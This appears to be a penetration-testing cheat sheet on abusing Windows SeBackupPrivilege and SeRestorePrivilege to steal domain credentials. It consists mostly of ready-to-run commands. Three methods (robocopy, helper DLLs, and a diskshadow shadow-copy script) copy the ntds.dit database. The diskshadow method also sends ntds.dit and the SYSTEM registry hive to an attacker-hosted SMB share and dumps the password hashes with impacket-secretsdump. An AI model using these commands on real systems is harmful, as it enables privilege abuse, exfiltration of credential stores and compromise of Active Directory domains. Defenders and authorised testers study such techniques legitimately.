---
title: "SeBackupPrivilege/SeRestorePrivilege"
date: 2024-7-18
tags: ["Credential Dumping", "File System", "SeBackupPrivilege", "SeRestorePrivilege", "Windows", "Backup Operators", "Diskshadow"]
---

### Abuse #1: Robocopy

```console
# For example
robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE>
```

---

### Abuse #2: Using helper dlls

```console
import-module .\SeBackupPrivilegeCmdLets.dll
```

```console
import-module .\SeBackupPrivilegeUtils.dll
```

```console
Copy-FileSeBackupPrivilege <TARGET_FILE_PATH> C:\ProgramData\<TARGET_FILE>
```

```console
# For example
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit
```

<small>*Ref: [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll?raw=true)*</small>
<br>
<small>*Ref: [SeBackupPrivilegeCmdLets.dll](https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll?raw=true)*</small>

---

### Abuse #3: Diskshadow

#### 1. Create a .dsh file

```console
set context persistent nowriters
set metadata C:\ProgramData\test.cab
set verbose on
add volume c: alias test
create
expose %test% x:
```

<br>

```console
# Convert to dos format
unix2dos vss.dsh
```

#### 2. Run vss.dsh

```console
# Upload and run
diskshadow /s C:\ProgramData\vss.dsh
```

#### 3. Host a smb server (In Linux)

```console
impacket-smbserver share . -smb2support
```

#### 4. Copy to local Linux

```console
net use \\<LOCAL_IP>\share
```

```console
Copy-FileSeBackupPrivilege x:\Windows\ntds\ntds.dit \\<LOCAL_IP>\share\ntds.dit
```

```console
reg.exe save hklm\system \\<LOCAL_IP>\share\system
```

#### 5. Secrets dump

```console
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```
